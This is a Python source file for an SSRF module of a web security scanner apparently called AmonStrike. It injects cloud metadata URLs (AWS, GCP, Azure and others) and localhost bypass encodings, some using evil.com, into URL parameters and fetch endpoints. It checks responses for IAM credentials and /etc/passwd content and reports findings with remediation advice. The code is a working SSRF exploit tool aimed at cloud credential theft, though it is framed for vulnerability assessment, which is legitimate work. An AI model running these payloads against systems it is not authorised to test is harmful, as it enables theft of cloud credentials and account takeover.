"""
AmonStrike — SSRF Module
Server-Side Request Forgery — gateway to cloud credential theft.
"""
import re
import uuid
from .base import BaseModule
try:
    from core.interactsh import OOBDetector
    _HAS_OOB = True
except Exception:
    _HAS_OOB = False

CLOUD_METADATA = {
    "AWS":   "http://169.254.169.254/latest/meta-data/",
    "GCP":   "http://metadata.google.internal/computeMetadata/v1/",
    "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "OCI":   "http://169.254.169.254/opc/v1/instance/",
    "Docker":"http://172.17.0.1/",
    "K8s":   "http://kubernetes.default.svc/",
}

BYPASS_VARIANTS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0177.0.0.01/",        # Octal IP
    "http://2130706433/",          # Decimal IP for 127.0.0.1
    "http://127.1/",
    "http://127.000.000.001/",
    "http://0x7f000001/",          # Hex IP
    "http://127.0.0.1:80/",
    "http://127.0.0.1%23@evil.com/",
    "http://evil.com@127.0.0.1/",
]

SSRF_PARAMS = [
    "url","redirect","next","return","callback","webhook",
    "dest","destination","uri","link","src","source","goto",
    "image","img","path","fetch","load","endpoint","proxy",
    "target","site","out","feed","data","host","to","ref",
]

SSRF_SIGNATURES = [
    "ami-id", "instance-id", "AccessKeyId", "iam/security-credentials",
    "computeMetadata", "metadata/instance", "local-ipv4",
    "root:x", "daemon:", "DOCUMENT_ROOT", "SSH_CLIENT",
]


class SsrfModule(BaseModule):
    NAME        = "ssrf"
    DESCRIPTION = "SSRF — cloud metadata, OOB, bypass variants, redirect chains"

    def run(self):
        self.log("Testing SSRF...")

        # Setup OOB for blind SSRF
        oob = None
        if _HAS_OOB:
            try:
                oob = OOBDetector()
                self.info["oob_url"] = oob.url
            except Exception:
                pass

        # Test all SSRF parameters
        self._test_url_params()

        # Test webhook/import features
        self._test_functional_ssrf()

        # Test redirect-based SSRF
        self._test_redirect_ssrf()

        self.log(f"SSRF complete — {len(self.findings)} findings", "+")
        return self.result()

    def _test_url_params(self):
        """Test query parameters that take URLs."""
        for param in SSRF_PARAMS:
            # Test cloud metadata directly
            for cloud, meta_url in CLOUD_METADATA.items():
                r = self.get(params={param: meta_url})
                if r and any(sig in r.text for sig in SSRF_SIGNATURES):
                    self._report_ssrf(param, meta_url, r, cloud)
                    return

            # Test internal bypass variants
            for bypass in BYPASS_VARIANTS[:5]:
                r = self.get(params={param: bypass})
                if r and r.status_code == 200:
                    if any(sig in r.text for sig in
                           ["root:x","daemon","uid=","HOME="]):
                        self._report_ssrf(param, bypass, r, "Internal")
                        return

    def _test_functional_ssrf(self):
        """Test features designed to fetch URLs (PDF gen, image import, etc.)."""
        ssrf_endpoints = [
            ("/api/webhook", "url"),
            ("/api/fetch",   "url"),
            ("/api/import",  "url"),
            ("/api/export",  "url"),
            ("/api/preview", "url"),
            ("/screenshot",  "url"),
            ("/pdf",         "url"),
            ("/render",      "url"),
        ]
        for path, param in ssrf_endpoints:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue
            for cloud, meta_url in CLOUD_METADATA.items():
                r2 = self.post(path, json={param: meta_url})
                if not r2:
                    r2 = self.get(path, params={param: meta_url})
                if r2 and any(sig in r2.text for sig in SSRF_SIGNATURES):
                    self._report_ssrf(param, meta_url, r2, cloud)
                    return

    def _test_redirect_ssrf(self):
        """Test open redirects that can be chained for SSRF."""
        redirect_params = ["redirect","next","return","goto","url","location"]
        for param in redirect_params:
            for meta_url in list(CLOUD_METADATA.values())[:2]:
                r = self.get(params={param: meta_url}, allow_redirects=True)
                if r and any(sig in r.text for sig in SSRF_SIGNATURES):
                    self._report_ssrf(param, meta_url, r, "Redirect Chain")

    def _report_ssrf(self, param: str, payload: str, r, cloud: str):
        # Identify what was exposed
        exposed = []
        if "AccessKeyId" in r.text:
            exposed.append("AWS IAM credentials")
        if "ami-id" in r.text or "instance-id" in r.text:
            exposed.append("AWS instance metadata")
        if "computeMetadata" in r.text:
            exposed.append("GCP metadata")
        if not exposed:
            exposed = ["internal server response"]

        self.add_finding(
            title       = f"SSRF — {cloud} Cloud Metadata Exposed via '{param}'",
            severity    = "CRITICAL",
            description = (
                f"Server-Side Request Forgery via '{param}' parameter reaches "
                f"{cloud} cloud metadata service. "
                f"Exposed: {', '.join(exposed)}. "
                f"Can escalate to full cloud account takeover."
            ),
            evidence    = (
                f"Parameter: {param}\nPayload: {payload}\n"
                f"Cloud: {cloud}\nExposed data: {', '.join(exposed)}\n"
                f"Response: {r.text[:400]}"
            ),
            remediation = (
                "Block requests to 169.254.169.254 at network level. "
                "Validate and whitelist allowed URL schemes/hosts. "
                "Enable IMDSv2 on all EC2 instances. "
                "Never allow user-controlled URLs in server-side HTTP calls."
            ),
            url         = self.url,
            parameter   = param,
            payload     = payload,
            cve         = "CWE-918",
        )
        self.info["ssrf_param"]   = param
        self.info["ssrf_payload"] = payload
        self.info["ssrf_cloud"]   = cloud
